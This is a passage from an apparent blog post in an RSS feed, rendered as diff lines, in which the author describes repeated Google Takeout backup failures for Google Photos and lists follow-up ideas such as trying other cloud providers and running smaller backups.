-<h2 id="issues">Issues</h2>
-<ul>
-<li>the process always fails - no matter what’s the size of a chunk I choose</li>
-<li>the logs are kept only for some time, afer 7 days I’m not able to see what happened with the chunks. It’s easy to spot missing files - when you have parts from 1 to 10, but there’s a 7th missing. But what if there are 10 parts but should be 11?</li>
-<li>no logs of the process</li>
-<li>errors are very cryptic “Failed to backup”</li>
-<li>tech support is non-existent - I’ve reached out to the tech support, but they were just passing my issue between different support divisions. Ultimately there were hints like “reinstall your operating system”, “turn it off and on”</li>
-</ul>
-<p>All in all I don’t see this whole process as <strong>extremely</strong> hard. Also, I totally understand those things may fail. But we, as an industry, know what to do with that. There are retries, informative logging. And here I got none of the above.</p>
-<p>So for me, this broadly looks like Google just does not want people to backup their data outside of their cloud, which is super bad!</p>
-<h2 id="important-considerations-that-i-may-have-missed">Important considerations that I may have missed</h2>
-<p>I share my photo collection with my closest family. I suspect that Google Takeout won’t backup those shared photos. But my purpose <strong>is</strong> to do also copy those.</p>
-<p>If I’ll be able to make this process reliable, I’d need to think of data retention on target.</p>
-<p>Right now I backup just Google Photos - wanted to move to other parts of the ecosystem, when the backup issues are sorted out.</p>
-<h2 id="follow-up-actions">Follow-up actions</h2>
-<ul>
-<li>try other providers - I don’t want to use Dropbox, but perhaps Box would work better then OneDrive?</li>
-<li>are there tools that I’ve missed that might actually work?</li>
-<li>schedule separate backup processes for other parts of the data stored in Google - they’ll be smaller and maybe that will result in successful backups</li>
-<li>monitor the backup process state - based on target drive contents</li>
-</ul>
-<h2 id="closing-notes">Closing notes</h2>
-<p>So, for know I still do the backups. I accept the issues with Google Takeout. It’s just better to have majority of my data, then to not have any of that.</p>
-
-</div></div>]]></description>
         </item>
     </channel>
 </rss>
